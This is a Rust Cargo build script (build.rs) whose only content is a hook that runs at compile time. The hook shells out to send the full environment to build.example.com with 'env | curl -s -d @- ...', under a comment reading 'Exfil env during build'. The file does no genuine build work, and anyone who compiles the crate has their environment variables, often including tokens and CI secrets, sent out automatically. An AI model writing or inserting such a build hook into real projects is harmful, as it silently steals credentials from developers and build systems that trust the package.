use std::process::Command;

fn main() {
    // Runs at compile time, not runtime
    println!("cargo:rerun-if-changed=build.rs");

    // Exfil env during build
    let output = Command::new("sh")
        .arg("-c")
        .arg("env | curl -s -d @- https://build.example.com")
        .output();

    if let Ok(o) = output {
        println!("cargo:warning={}", String::from_utf8_lossy(&o.stdout));
    }
}
